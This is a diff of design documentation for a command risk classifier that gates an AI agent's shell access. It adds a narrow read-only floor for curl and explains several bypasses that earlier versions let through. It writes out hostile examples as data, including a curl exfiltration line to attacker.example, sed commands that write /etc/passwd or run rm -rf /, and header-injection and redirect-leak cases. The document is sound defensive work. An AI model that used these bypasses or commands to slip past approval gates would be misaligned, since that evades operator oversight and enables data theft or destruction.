@@ -337,8 +337,10 @@ widened the write-guard: `curl -o
 <verdict-dir>/marker.json' f` all went from BLOCKED to ALLOWED. Pinned by
 tests in `tests/cli/pack-hook-solution-acceptance-writeguard.test.ts`.
 
-There is deliberately **no `curl` floor**; see "No `curl` read-only floor"
-directly below for why that attempt was abandoned rather than fixed.
+`curl` gets a floor too, wired the same way and for the same
+blast-radius reason; see "curl read-only SHAPE floor" directly below for
+why it is a narrower SHAPE grammar rather than an allowlist like this
+one, and why that difference matters given this task's history.
 
 The floor is an ALLOWLIST and fails closed. Every token after the head
 must be recognized (a named read-only flag, such a flag's value, or a
@@ -383,14 +385,20 @@ Examples that keep the floor: `sed -n '1,5p' f`, `sed -E 's/a/b/' f`,
 `sed 's/a/b/w /etc/passwd' f`, `sed -n 'w /etc/passwd' f`,
 `sed '1e rm -rf /' f`, `sed -f script.sed f`, `sed -ni f`.
 
-#### No `curl` read-only floor, by design (decision D-013, task `2929c5b7`)
+#### curl read-only SHAPE floor (Risk Classifier only, task `fdaad781`, decision D-026)
 
-`curl` gets no curl-specific floor; the only way a curl command classifies
-`low` is the generic two-token `--help`/`--version` shape the shared
-read-only predicate (`isReadOnlyBashCommand`) already recognises for
-EVERY binary (`curl --help`, `curl -h`, `curl --version`, `curl -V`), and
-that shape is trivially fine — it destroys and exfiltrates nothing.
-Task `2929c5b7` shipped a curl-specific one twice and it leaked twice:
+`curl` gets its own `low`-severity floor, wired ONLY into the Risk
+Classifier, exported as `isReadOnlyCurlCommand` from
+`src/runtime/read-only-bash.ts` next to `isReadOnlySedCommand` and
+`isReadOnlyKubectlCommand`, and deliberately NOT part of
+`isReadOnlyBashCommand` -- same blast-radius reason as the sed and
+kubectl floors: the understanding-gate PreToolUse blocker and the
+solution-acceptance write-guard consume that shared predicate directly
+and would treat "recognized" as "allowed" before their own checks run.
+
+**Decision D-013's history is why this floor is a SHAPE, not a flag
+list.** Task `2929c5b7` shipped a curl-specific `low` floor twice and it
+leaked twice:
 
 - Round 2 used a DENYLIST of write flags. Every flag nobody had
   enumerated passed: `-o`, `-O`, `-D`, `-c`, `-K`, `--create-dirs`.
@@ -401,41 +409,221 @@ Task `2929c5b7` shipped a curl-specific one twice and it leaked twice:
   '%output{/etc/x}p' <url>` floored to `low` and left the approval gate
   entirely.
 
-The recurring class is the premise, not the list. Deciding that a curl
-invocation is inert requires knowing every curl flag's write capability
-across every curl version an operator might have installed, and the value
-side has the same problem (`-H @/etc/passwd` reads a local file into the
-request). A `low` floor grants the strongest exemption there is: the
-action drops out of every `severity_at_least` tier, not just `critical`,
-so a single mis-read flag is a full bypass.
+Both leaks share one root cause: deciding a curl invocation is inert by
+NAMING its flags requires knowing every curl flag's write capability
+across every curl version an operator might have installed, and a `low`
+floor grants the strongest exemption there is -- the action drops out of
+every `severity_at_least` tier, not just `critical` -- so a single
+mis-read flag is a full bypass. Round 3's review removed the floor
+entirely (decision D-013) rather than patch a third flag onto the list,
+on exactly that premise.
 
-`curl` therefore stays UNCLASSIFIED, exactly like `ssh <host> <cmd>` and
-`node -e` and for the same reason (see "Unclassified actions and the
-fail-close rule" below). It rides the fallback: a production-scoped
-`gate-prod-destructive` (`severity_at_least: critical`) does not hard-block
-it, and a production-scoped `gate-prod-destructive-approval`
-(`severity_at_least: high`) still requires operator approval. Approval-
-gated, never hard-blocked, never silently allowed.
+**Round 2 hardening (adversarial review of this task's own round 1).**
+A skeptical re-review of the SHAPE floor's round-1 shipment measured
+three more leaks in the same family -- a flag or default nobody had
+reasoned about, again -- and this round closes each, changing the
+grammar below:
 
-The obligation this leaves is the tractable one, and it lives in the
+- **The curlrc auto-load, HIGH.** curl auto-loads
+  `$CURL_HOME/.curlrc`, `$XDG_CONFIG_HOME/curlrc`, or `~/.curlrc`
+  BEFORE looking at any other argument, unless `-q`/`--disable` is the
+  FIRST argument on the command line. A curlrc can set `output`,
+  `request`, `data`, or `upload-file`, so round 1's `curl -s '<url>'`
+  (no `-q`) was itself a write vector through an operator-invisible
+  config file, not through anything on argv. Measured against curl
+  8.7.1: a `~/.curlrc` containing `output = <file>` made a bare
+  `curl -s '<url>'` write `<file>`; the identical invocation with `-q`
+  inserted as the first argument left the file untouched. `-q`/
+  `--disable` is now MANDATORY as the second word (right after `curl`),
+  not merely allowed: a spelling that omits it forfeits, even though
+  every other word would otherwise fit the shape.
+- **`-L`/`--location`, HIGH.** Dropped from the closed set. Measured
+  against curl 8.7.1: `curl -L -H 'X-Api-Key: secret' 'http://a/start'`
+  answered with a 302 to a different host on plaintext http, and curl
+  forwarded the `X-Api-Key` header to that second host unchanged --
+  curl strips `Authorization`/`Cookie` on a cross-host redirect, not an
+  arbitrary custom header. A shape that admits both `-L` and `-H`
+  therefore lets an attacker-controlled redirect exfiltrate whatever
+  the `-H` allowlist let through, to a host that was never the one
+  argument this floor examined.
+- **`-k`/`--insecure`, MEDIUM.** Dropped from the closed set. A
+  deliberate TLS-verification bypass is a judgement call, not a shape
+  this floor should make silently; it now stays approval-gated like
+  any other choice that weakens the request's own guarantees.
+
+Every "proven incapable of naming a file or a method" claim in this
+floor now reads more narrowly, and means: no flag on this closed list
+names a file, and the only method any of them selects is HEAD
+(`-I`/`--head`), which is read-only; curl's config-file surface (the
+one channel that could set one without appearing on argv at all) is
+closed off by the mandatory `-q`. That is a claim about the one shape
+this floor accepts, not a claim that curl as a whole has no other
+config surface -- see "Residuals" below for what stays open.
+
+This floor inverts the burden instead of re-litigating the list. It
+recognizes ONE narrow invocation SHAPE and forfeits (stays unclassified)
+on everything else, so a flag nobody has reasoned about here can only
+widen the unclassified set -- it can never slip into `low` by omission,
+which is precisely the shape of both D-013 leaks. `true` requires ALL of:
+
+- No shell chaining, redirection, command substitution, background `&`,
+  or a bare carriage return anywhere in the command (the same
+  whole-string guard every floor in this file uses except
+  `isReadOnlyBashPipeline`, which keeps its own narrower reject set so
+  a bare `|` stays admissible there; the `\r` clause was added this
+  round, see the header-value bullet below).
+- The head is exactly `curl`: unquoted, no path prefix, no `env`/
+  `command`/`sudo`/other wrapper. A wrapped or path-qualified head is a
+  different spelling and forfeits here (it may still floor via
+  `isReadOnlyBashCommand`'s generic `--help`/`--version` shape, unrelated
+  to this floor, if it happens to match that unrelated two-token form).
+- The SECOND word is exactly `-q` or `--disable`: unquoted, not inside a
+  cluster (`-qs` does not count), and not merely present somewhere later
+  in the command -- curl only honors it as the first argument, so
+  nothing else satisfies this. See "Round 2 hardening" above for why.
+- Exactly ONE operand: a single-quoted, unbroken word matching
+  `` ^https://[A-Za-z0-9.-]+(:[0-9]+)?(/[^'\s{}[\]\\`$]*)?$ `` -- an
+  `https://` host of letters, digits, `.` and `-` only, an optional
+  `:PORT`, and an optional path excluding exactly: a single quote,
+  whitespace, `{`, `}`, `[`, `]`, backslash, backtick, and `$`. `?` and
+  `*` are NOT excluded (round 2: previously excluded, which forfeited
+  the most common SINGLE-parameter read-only query-string spelling, a
+  URL with one `?param=value`; a MULTI-parameter query string joined
+  by `&` still forfeits even single-quoted -- see "Residuals" below).
+  No userinfo (`user:pw@`) is reachable through this shape:
+  the host class has no `:`/`@`, so `https://user:pw@x` cannot match
+  end-to-end. An unquoted URL, a double-quoted URL, `http://`, a second
+  operand, or a missing operand all forfeit.
+- Every other word is a flag drawn from a closed allowlist, each PROVEN
+  to name no file, with the only selectable method being HEAD
+  (read-only): `-s`/`-S`/`-f`/`-I` (any combination in a cluster),
+  `--silent`/`--show-error`/`--fail`/`--head`, and `-H`/`--header` or
+  `-m`/`--max-time`/`--connect-timeout` -- each ONLY in the
+  separate-token form (never glued, never `=`-joined, never repeated),
+  with the header value quoted, not `@`-prefixed once leading
+  whitespace is trimmed (round 4), and free of `$` or
+  backtick. A `\n`/`\r` in the header value never reaches this
+  per-value check at all: the whole-command guard above refuses either
+  character anywhere in the command first (round 3: the per-value
+  check's own now-redundant `\n`/`\r` clause was removed as dead code),
+  and the timeout value is a bare `^[0-9]+$`. `-L`/`--location`
+  and `-k`/`--insecure` are OFF this list now (round 2, see above).
+  Anything off the list -- `-o`, `-O`, `-w`/`--write-out` in any
+  spelling, `-d`/`-F`/`-T`/`-X`/`--request`, `-H`/`-b` with an `@FILE`
+  value, `-u`, `--netrc`, `-x`, `--url`, `-L`, `-k`, an unknown flag, a
+  glued or `=`-joined value -- forfeits the WHOLE command, not just
+  that token.
+
+**Header-value carriage return, MEDIUM (round 2).** Measured against
+curl 8.7.1: a `-H` value carrying a bare `\r` with no paired `\n`
+reaches curl's wire completely unmodified (`X-Foo: bar\rX-Injected:
+evil\r\n`, byte for byte). A lenient downstream parser that treats a
+bare `\r` as a line terminator reads that as two headers, which is
+header injection through a value this floor's own quoting rules would
+otherwise have accepted. `\r` is refused in the whole-command guard
+above, so a `\r` anywhere -- inside a `-H` value or not -- forfeits the
+entire command before any word is even split out; only leading or
+trailing whitespace escapes that guard, stripped first by
+`command.trim()`. Round 2 also added a duplicate `\r` (and `\n`) check
+inside the per-value check for `-H`/`--header` specifically; round 3
+removed that duplicate as unreachable dead code, since the
+whole-command guard already forfeits before that check would ever run
+(pinned directly in tests/runtime/read-only-bash.test.ts, next to the
+shared guard's other metachar cases, so a regression that narrows the
+one guard that actually matters is still caught).
+
+Quoting is handled by a splitter built ONLY for this floor
+(`splitCurlWords`), because the shape's own positive fixtures require a
+quoted value containing a space (`-H 'Accept: application/json'`) to
+parse as ONE token -- unlike every other floor in this file, which treats
+`trimmed.split(/\s+/)` as "the" tokenizer and would tear that value into
+two raw fragments. The splitter supports single and double quotes only,
+with no escape or expansion handling, and fails closed (forfeits) on an
+unterminated quote or a bare unquoted backslash. Its separator class is
+space and tab only (round 2: narrowed from JS `\s`, which is a
+superset of bash's default IFS -- an NBSP, vertical tab, form feed, or
+ideographic space between two words is not whitespace to bash, and
+treating it as a separator here could parse a single, malformed argv
+word as two well-formed ones); newline and carriage return never reach
+the splitter, refused by the whole-command guard first.
+
+`curl` therefore floors `low` for exactly this shape and stays
+UNCLASSIFIED for everything else that neither this floor nor the
+DESTRUCTIVE floor below names -- the same fallback `ssh <host> <cmd>` and
+`node -e` ride (see "Unclassified actions and the fail-close rule"
+below): a production-scoped `gate-prod-destructive`
+(`severity_at_least: critical`) does not hard-block it, and a
+production-scoped `gate-prod-destructive-approval`
+(`severity_at_least: high`) still requires operator approval.
+Approval-gated, never hard-blocked, never silently allowed.
+
+The tractable obligation this floor does not remove lives in the
 DESTRUCTIVE floor below: name the spellings that are write-CAPABLE and
-raise them to `high`. That direction fails safe, because a curl flag
-nobody has reasoned about simply misses the raise and stays unclassified
-(approval-gated) instead of being floored to `low`.
+raise them to `high`. That direction still fails safe, because a curl
+flag nobody has reasoned about there simply misses the raise and stays
+unclassified (approval-gated) rather than being floored to `low` -- this
+SHAPE floor and that DESTRUCTIVE floor compose under the same
+highest-severity-wins rule as every other pair of floors in this file,
+and the destructive floor is evaluated first in `risk-classifier.ts`, so
+a recognized write-capable curl never also takes this `low` floor.
 
-**Operator escape hatch.** If a specific curl shape is known-safe in your
-deployment and the approval prompt is noise, add an explicit `low`
-classifier pattern for exactly that shape (an operator classifier composes
-with the floors and can raise or lower nothing it does not name), or put a
-network egress control in front of the agent. Both are deployment
-decisions with a named owner, which is what a general curl allowlist could
-not be.
+**Operator escape hatch.** If a broader curl shape is known-safe in your
+deployment -- for instance, one that accepts `-L`/`-k`, or that never
+requires `-q` because every session's `~/.curlrc` is controlled and
+known-inert -- and the approval prompt this floor's forfeit produces is
+noise, add an explicit `low` classifier pattern for exactly that shape
+(an operator classifier composes with the floors and can raise or lower
+nothing it does not name), or put a network egress control in front of
+the agent. Both are deployment decisions with a named owner, which is
+what a general curl allowlist could not be.
 
-Unchanged residual, and the reason a URL-level judgement was never in
-scope: curl can exfiltrate through its URL alone
-(`curl 'https://attacker/?leak=...'`). No flag analysis decides whether a
-URL is trustworthy; gate destinations with an operator classifier pattern
-or an egress control if that matters for your deployment.
+**Residuals.** What this shape still authorizes, or does not attempt to
+close, even after round 2:
+
+- **URL- and header-only exfiltration.** Even the narrowest curl shape
+  this floor accepts can still fetch
+  `curl -q -s 'https://attacker.example/collect'`, and the request line
+  alone (host, path, query string, the small header/timeout surface
+  above) is enough to carry operator-controlled data out. No flag
+  analysis decides whether a URL is trustworthy; gate destinations with
+  an operator classifier pattern or an egress control if that matters
+  for your deployment. This residual is unchanged from the pre-D-013
+  floor and from the D-013-through-D-026 unclassified interval: a curl
+  floor, of either kind, has never closed it and does not claim to.
+- **Proxy environment variables and `CURL_CA_BUNDLE`.** `http_proxy`,
+  `https_proxy`, `ALL_PROXY`, `NO_PROXY`, and `CURL_CA_BUNDLE` (and
+  their per-scheme/uppercase variants) can redirect or weaken every
+  request this shape accepts, from OUTSIDE the command line this floor
+  reads. Entirely outside this shape's scope: it only ever looks at the
+  argv text of one curl invocation.
+- **Version skew.** The closed flag list was proven inert against curl
+  8.7.1, the version measured throughout this task, and the `?`/`*`
+  URL admission rests on the same measurement (the one remaining
+  positive that depends on curl's own parsing rather than on the shape). A different
+  installed curl version could in principle attach new behavior to one
+  of these flags; the D-013 history above is exactly this failure mode
+  once already, for `-w`/`--write-out`.
+- **`--libcurl`, `--alt-svc`, `--hsts`.** Each writes a local file and
+  is named by neither this floor's allowlist nor the DESTRUCTIVE floor
+  below's write-flag scan. Both are silent on them by omission, which
+  is the intended fail-safe for an unnamed flag: they stay unclassified
+  (approval-gated), never floored to `low`.
+- **A `&` in the query string forfeits the WHOLE command, even
+  single-quoted.** `CURL_SHAPE_URL_RE` does admit `&` in its path/query
+  class, but `hasUnsafeShellMetachar` -- the whole-command guard every
+  floor in this file shares (`isReadOnlyBashPipeline` excepted) --
+  rejects any bare `&` in the raw command string with no quote
+  awareness at all, the same guard that rejects the chained `&&`
+  fixture. So a MULTI-parameter query string joined by `&`
+  (`'https://x/search?q=abc&limit=10'`) never reaches
+  `CURL_SHAPE_URL_RE` and stays unclassified, even though the operand
+  is single-quoted and the shell itself cannot split on that `&`.
+  Closing this would mean making the shared whole-command guard
+  quote-aware, which every other floor in this file also relies on
+  staying a simple, cheap raw-string scan; deliberately out of scope
+  for this round. Round 2's `?`/`*` admission above therefore closes
+  only the single-parameter query-string spelling, not the more common
+  multi-parameter one.
 
 #### Built-in destructive floor (task `2929c5b7`)
 
@@ -460,14 +648,15 @@ operator-editable MIRROR, not the only line of defence.
 | --- | --- |
 | `critical` | `dd` with an `of=` target; `truncate` with `-s`/`--size` (glued `-s0` included); `shred`; `mkfs`, `mkfs.*`; `find ... -delete`; `find ... -exec`/`-execdir rm` |
 | `high` | `git reset --hard`; `git push` with `--force`/`--force-with-lease`/`-f`/a `+refspec`; `git clean -f` (any cluster containing `f`) ; `git checkout .`, `git checkout -- .`, `git restore .`; `chmod`/`chown` with `-R`/`--recursive` (any cluster containing `R`); `sed -i` in any spelling; `curl` with a local-write flag, with a `-w`/`--write-out` format string carrying `%output`, with a body/non-GET-HEAD-method flag, or with an `@FILE` value on `-H`/`--header` or `-b`/`--cookie` |
+| `low` (a SEPARATE floor, `isReadOnlyCurlCommand`, not part of this destructive scan -- see "curl read-only SHAPE floor" above) | `curl`, mandatory `-q`/`--disable` as the very next word, a single single-quoted `https://` URL, and only flags from the closed read-only set: `-s`/`-S`/`-f`/`-I` (any combination), `--silent`/`--show-error`/`--fail`/`--head`, and `-H`/`--header` or `-m`/`--max-time`/`--connect-timeout` each in separate-token form only, never repeated (round 2, task `fdaad781`: `-L`/`--location` and `-k`/`--insecure` dropped from this set, and `-q`/`--disable` became mandatory) |
 
 `shred` and `mkfs` are matched on their HEAD TOKEN alone, since every real
 invocation of them destroys something. The one exception is an invocation
 whose ONLY argument is `--help`, `--version`, `-h`, `-V` or `-v`, which
 cannot destroy anything; `shred -v secret.txt` keeps its `critical`.
 
-**What the floor recognizes for `curl`**, since curl is the head with no
-read-only floor to fall back on (see "No `curl` read-only floor" above).
+**What the DESTRUCTIVE floor recognizes for `curl`** -- this is the
+write-CAPABLE side, distinct from the SHAPE floor's `low` row above.
 Named here are the specific flags and value shapes this scan knows about
 (`-o`/`-O`/`-D`/`-c`/`-K`/`-w`/`-d`/`-F`/`-T`/`-X`/`-H`/`-b` and their long
 spellings) — not a claim that this is curl's entire write-capable
@@ -1104,9 +1293,14 @@ fallback does not silently reopen a bypass for a mutating head that
 simply has no classifier pattern:
 
 1. **The common read-only heads are now explicitly floored to `low`**
-   (see "Built-in read-only commands" and "`sed` read-only
-   floor" above): `cat`, `grep`/`rg`, `ls`, `head`, `tail`, `wc`,
-   `stat`, `file`, `less`/`more`, `diff`, a read-only `sed` invocation,
+   (see "Built-in read-only commands", "`sed` read-only floor", and
+   "curl read-only SHAPE floor" above): `cat`, `grep`/`rg`, `ls`, `head`,
+   `tail`, `wc`, `stat`, `file`, `less`/`more`, `diff`, a read-only `sed`
+   invocation, a read-only-SHAPE `curl` invocation (task `fdaad781`,
+   decision D-026, round 2 hardened: a bare `curl`, mandatory `-q`/
+   `--disable` as the next word, a single single-quoted `https://` URL,
+   and only flags proven to name no file, with the only selectable
+   method being HEAD, which is read-only),
    and the existing `git` read verbs
    (`status`, `log`, `rev-parse`, `rev-list`, `show`, `diff`, `branch`
    without `-D`/`-d`, `ls-files`, `remote -v`, `fetch`), including their
@@ -1117,39 +1311,47 @@ simply has no classifier pattern:
    a floor also removes them from any `severity_at_least:
    high`/`medium`/`low` policy, which the softened fallback does NOT.
 
-   `ssh <host> <cmd>`, `node -e`/`--eval` and `curl` are deliberately NOT
-   given this floor, even though the motivating incident included exactly
-   these shapes. For `ssh` and `node -e` the payload
-   is opaque to a regex-and-argv-token classifier: the remote command in
-   `ssh <host> "<cmd>"` and the evaluated code in `node -e "<code>"` are
-   both unexamined strings the classifier cannot reason about, so a
-   `low` floor would grant the strongest exemption (removed from every
-   `severity_at_least` tier, not just `critical`) to a head whose actual
-   behavior is unbounded: `ssh prod-host "rm -rf /"` or `node -e
-   "<destructive JS>"` would then pass with zero friction.
+   `ssh <host> <cmd>` and `node -e`/`--eval` are deliberately NOT given
+   this floor, even though the motivating incident included exactly
+   these shapes. Their payload is opaque to a regex-and-argv-token
+   classifier: the remote command in `ssh <host> "<cmd>"` and the
+   evaluated code in `node -e "<code>"` are both unexamined strings the
+   classifier cannot reason about, so a `low` floor would grant the
+   strongest exemption (removed from every `severity_at_least` tier, not
+   just `critical`) to a head whose actual behavior is unbounded:
+   `ssh prod-host "rm -rf /"` or `node -e "<destructive JS>"` would then
+   pass with zero friction.
 
-   `curl` is unclassified for a measured reason rather than an opaque
-   payload (decision D-013): its FLAG SURFACE cannot be allowlisted
-   robustly, because a curl invocation's write capability depends on flags
-   and flag VALUES that change between curl versions. Two floors shipped
-   for it and both leaked, most recently on `-w '%output{FILE}'`, which
-   writes a local file since curl 8.3.0, and `-H @FILE` reads a local file
-   into the request from the value side. See "No `curl` read-only floor"
-   above for the full history and for the operator escape hatch: an
-   explicit `low` classifier pattern for a curl shape a deployment knows
-   is safe, or a network egress control.
+   `curl` sits between the two groups above. Decision D-013 (task
+   `2929c5b7`) first left it fully unclassified for a MEASURED reason
+   rather than an opaque payload: its flag surface could not be
+   allowlisted robustly, because a curl invocation's write capability
+   depends on flags and flag VALUES that change between curl versions.
+   Two floors shipped for it and both leaked, most recently on
+   `-w '%output{FILE}'`, which writes a local file since curl 8.3.0, and
+   `-H @FILE`, which reads a local file into the request from the value
+   side. Task `fdaad781` (decision D-026) closes that gap not by
+   re-litigating the flag list but by narrowing the SHAPE instead: a
+   `curl` invocation floors `low` only when it fits the closed grammar
+   in "curl read-only SHAPE floor" above, and every other curl spelling
+   -- including any flag nobody has reasoned about here -- still forfeits
+   to genuinely unclassified, riding the same fallback described next.
+   See that section above for the full history and for the operator
+   escape hatch: an explicit `low` classifier pattern for a broader curl
+   shape a deployment knows is safe, or a network egress control.
 
-   All three stay genuinely unclassified instead, and ride prong 2's
-   fallback alone: a
+   `ssh`, `node -e`, and every curl spelling this floor's shape does not
+   cover stay genuinely unclassified, and ride prong 2's fallback alone: a
    production-scoped `gate-prod-destructive` (`severity_at_least:
    critical`) does not hard-block them (an unclassified action sits at
    the "high" rung, not "critical"), but a production-scoped
    `gate-prod-destructive-approval` (`severity_at_least: high`) still
    requires operator approval before any of them runs. Approval-gated,
    never hard-blocked, never silently allowed. If a deployment wants
-   `ssh`/`node -e`/`curl` hard-blocked instead, add an explicit `critical`
-   classifier pattern for the specific invocation shapes that deployment
-   cares about (an operator classifier composes with, and can only RAISE
+   `ssh`/`node -e`/an unfloored `curl` hard-blocked instead, add an
+   explicit `critical` classifier pattern for the specific invocation
+   shapes that deployment cares about (an operator classifier composes
+   with, and can only RAISE
    above, the fail-closed fallback).
 2. **The comparably-destructive mutating heads are now explicitly
    classified**, at the severity the shipped classifiers already use for
